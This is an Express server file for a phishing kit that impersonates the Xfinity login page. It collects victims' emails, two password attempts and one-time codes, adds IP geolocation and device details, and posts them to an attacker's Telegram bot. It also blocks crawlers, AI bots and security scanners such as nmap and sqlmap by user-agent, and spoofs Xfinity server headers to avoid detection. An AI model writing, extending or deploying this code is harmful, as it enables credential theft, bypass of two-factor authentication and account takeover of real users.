import express from 'express';
import { fileURLToPath } from 'url';
import { dirname, join } from 'path';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Remove Express default X-Powered-By header to hide server identity
app.disable('x-powered-by');

// --- Bot / Crawler / Scanner Blocking Middleware ---
const BOT_UA_PATTERN = /bot|crawler|spider|crawling|slurp|mediapartners|googlebot|bingbot|yandexbot|baiduspider|duckduckbot|facebookexternalhit|twitterbot|linkedinbot|embedly|quora link preview|showyoubot|outbrain|pinterest|applebot|semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|seznambot|ia_archiver|archive\.org_bot|blexbot|dataforseobot|megaindex|sogou|exabot|petalbot|serpstatbot|zoominfobot|majestic|mojeekbot|domcop|gptbot|chatgpt|ccbot|anthropic|claudebot|google-extended|bytespider|amazonbot|meta-externalagent|perplexitybot|cohere-ai|ai2bot|diffbot|friendlycrawler|scrapy|httrack|harvest|extract|collect|nutch|scan|masscan|nmap|nikto|sqlmap|nessus|openvas|acunetix|burpsuite|dirbuster|gobuster|wfuzz|ffuf|whatweb|wapiti|skipfish|arachni|zap|owasp|curl\/|wget\/|python-requests|httpx|nuclei|subfinder|amass|shodan|censys|internetmeasur/i;

app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  if (BOT_UA_PATTERN.test(ua)) {
    return res.status(403).send('Access denied');
  }
  next();
});

// --- Security Headers & Domain Hiding Middleware ---
app.use((req, res, next) => {
  // Domain hiding — masquerade as Xfinity infrastructure
  res.setHeader('Server', 'Xfinity-Gateway');
  res.setHeader('X-Powered-By', 'Xfinity-Platform');
  res.setHeader('Via', '1.1 login.xfinity.com');

  // HSTS — force HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains; preload');

  // Cross-origin isolation — prevent embedding / leaking
  res.setHeader('Cross-Origin-Opener-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin');
  res.setHeader('Cross-Origin-Embedder-Policy', 'require-corp');

  // Prevent DNS prefetch to avoid leaking the real domain
  res.setHeader('X-DNS-Prefetch-Control', 'off');

  // Security headers — prevent framing, sniffing, caching, indexing
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
  res.setHeader('Pragma', 'no-cache');
  res.setHeader('Expires', '0');
  res.setHeader('Permissions-Policy', 'camera=(), microphone=(), geolocation=(), interest-cohort=()');
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, nosnippet, noarchive, notranslate, noimageindex');

  // CSP — prevent framing and restrict resources
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self' https://login.xfinity.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; style-src 'self' 'unsafe-inline' https://login.xfinity.com; img-src 'self' data: https://login.xfinity.com https://*.xfinity.com; font-src 'self' https://login.xfinity.com; connect-src 'self' https://api.telegram.org; frame-ancestors 'none'"
  );

  next();
});

// Middleware
app.use(express.json());

// --- Telegram API Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const FETCH_TIMEOUT = 15000;

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

const getClientIp = (req) => {
  return (
    req.headers['x-forwarded-for'] ||
    req.headers['x-real-ip'] ||
    req.headers['cf-connecting-ip'] ||
    req.socket.remoteAddress ||
    'Unknown'
  ).toString().split(',')[0].trim();
};

const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') return location;
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,query`, {
      signal: createTimeoutSignal(3000),
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

const getDeviceDetails = (userAgent) => {
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: 'Browser',
    os: 'OS',
  };
};

// Try to use ua-parser-js if available
let UAParser;
import('ua-parser-js').then(mod => {
  UAParser = mod.UAParser || mod.default || mod;
}).catch(() => {
  // ua-parser-js not available, use basic detection
});

const getDeviceDetailsWithParser = (userAgent) => {
  if (UAParser) {
    const uaParser = new UAParser(userAgent || '');
    const browser = uaParser.getBrowser();
    const os = uaParser.getOS();
    return {
      deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
      browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
      os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
    };
  }
  return getDeviceDetails(userAgent);
};

const escapeMarkdown = (text) => {
  if (!text) return text;
  return String(text).replace(/\\/g, '\\\\').replace(/[_*`\[]/g, '\\$&');
};

const composeCredentialsMessage = (data) => {
  const {
    email, provider, firstAttemptPassword, secondAttemptPassword,
    clientIP, location, deviceDetails, timestamp, sessionId,
  } = data;

  const safeEmail = escapeMarkdown(email || 'Not captured');
  const safeFirstPw = escapeMarkdown(firstAttemptPassword);
  const safeSecondPw = escapeMarkdown(secondAttemptPassword);
  const safeProvider = escapeMarkdown(provider || 'Xfinity');
  const safeIP = escapeMarkdown(clientIP);
  const safeRegion = escapeMarkdown(location.regionName);
  const safeCountry = escapeMarkdown(location.country);
  const safeOS = escapeMarkdown(deviceDetails.os);
  const safeBrowser = escapeMarkdown(deviceDetails.browser);
  const safeDevice = escapeMarkdown(deviceDetails.deviceType);
  const safeSessionId = escapeMarkdown(sessionId);

  const passwordSection = `🔑 First (invalid): ${safeFirstPw}\n🔑 Second (valid): ${safeSecondPw}`;

  const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true
  }) + ' UTC';

  return `
*🔐 BobbyBoxResults - Credentials 🔐*

*ACCOUNT DETAILS*
- 📧 Email: ${safeEmail}
- 🏢 Provider: *${safeProvider}*
- ${passwordSection}

*DEVICE & LOCATION*
- 📍 IP Address: ${safeIP}
- 🌍 Location: *${safeRegion}, ${safeCountry}*
- 💻 OS: *${safeOS}*
- 🌐 Browser: *${safeBrowser}*
- 🖥️ Device Type: *${safeDevice}*

*SESSION INFO*
- 🕒 Timestamp: *${formattedTimestamp}*
- 🆔 Session ID: ${safeSessionId}
`;
};

const composeOtpMessage = (data) => {
  const { otp, session } = data;
  const { email, sessionId } = session || {};

  const safeOtp = escapeMarkdown(otp);
  const safeEmail = escapeMarkdown(email || 'N/A');
  const safeSessionId = escapeMarkdown(sessionId);

  const formattedTimestamp = new Date().toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true
  }) + ' UTC';

  return `
*🔑 BobbyBoxResults - OTP Code 🔑*

*VERIFICATION CODE*
- 🔢 OTP Code: ${safeOtp}

*ASSOCIATED SESSION*
- 📧 Email: ${safeEmail}
- 🆔 Session ID: ${safeSessionId}

*SUBMITTED AT*
- 🕒 Timestamp: *${formattedTimestamp}*
`;
};

// --- Simple rate limiter ---
const rateLimitMap = new Map();
const RATE_LIMIT_WINDOW = 60 * 1000; // 1 minute
const RATE_LIMIT_MAX = 10; // max requests per window per IP

const rateLimit = (req, res, next) => {
  const ip = getClientIp(req);
  const now = Date.now();
  const entry = rateLimitMap.get(ip);

  if (!entry || now - entry.start > RATE_LIMIT_WINDOW) {
    rateLimitMap.set(ip, { start: now, count: 1 });
    return next();
  }

  entry.count++;
  if (entry.count > RATE_LIMIT_MAX) {
    return res.status(429).json({ error: 'Too many requests.' });
  }
  return next();
};

// --- API Routes ---

// Credentials-only endpoint
app.post('/api/sendTelegram', rateLimit, async (req, res) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return res.status(500).json({ success: false, message: 'Server misconfiguration.' });
  }

  try {
    const data = req.body;

    // Validate: this endpoint handles credentials ONLY.
    if (data.otp || !data.email || !data.firstAttemptPassword) {
      return res.status(400).json({ error: 'Invalid payload for credentials endpoint. Use /api/sendOtp for OTP submissions.' });
    }

    const clientIP = getClientIp(req);
    const location = await getIpAndLocation(clientIP);
    const deviceDetails = getDeviceDetailsWithParser(data.userAgent);
    const sessionId = data.sessionId || Math.random().toString(36).substring(2, 15);
    const messageData = { ...data, clientIP, location, deviceDetails, sessionId };
    const message = composeCredentialsMessage(messageData);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
      return res.status(502).json({ success: false, error: 'Failed to send message.' });
    }

    return res.json({ success: true, sessionId: data?.sessionId });
  } catch (error) {
    console.error('Function execution error:', error.message);
    return res.status(500).json({ error: 'An internal server error occurred.' });
  }
});

// Separate OTP-only endpoint
app.post('/api/sendOtp', rateLimit, async (req, res) => {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return res.status(500).json({ success: false, message: 'Server misconfiguration.' });
  }

  try {
    const body = req.body;

    // Validate: this endpoint handles OTP ONLY.
    if (!body.otp) {
      return res.status(400).json({ error: 'Invalid payload for OTP endpoint. Missing otp field.' });
    }
    if (body.firstAttemptPassword || body.secondAttemptPassword) {
      return res.status(400).json({ error: 'Invalid payload for OTP endpoint. Use /api/sendTelegram for credentials.' });
    }

    const message = composeOtpMessage(body);

    const telegramResponse = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
      return res.status(502).json({ success: false, error: 'Failed to send OTP message.' });
    }

    return res.json({ success: true });
  } catch (error) {
    console.error('sendOtp error:', error.message);
    return res.status(500).json({ error: 'An internal server error occurred.' });
  }
});

// --- Static File Serving ---
const distPath = join(__dirname, 'dist');

// Serve static files from dist/ with correct MIME types for .js.download files
app.use(express.static(distPath, {
  setHeaders: (res, filePath) => {
    if (filePath.endsWith('.js.download')) {
      res.setHeader('Content-Type', 'application/javascript; charset=utf-8');
    }
  },
}));

// Serve the Xfinity login page at root
app.get('/', (req, res) => {
  res.sendFile(join(distPath, 'login.html'));
});

// SPA fallback - for /password, /otp and other React routes
app.get('*', (req, res) => {
  // If the request is for a file that exists in dist, it was already served by express.static
  // Otherwise, serve index.html for the React SPA to handle client-side routing
  res.sendFile(join(distPath, 'index.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
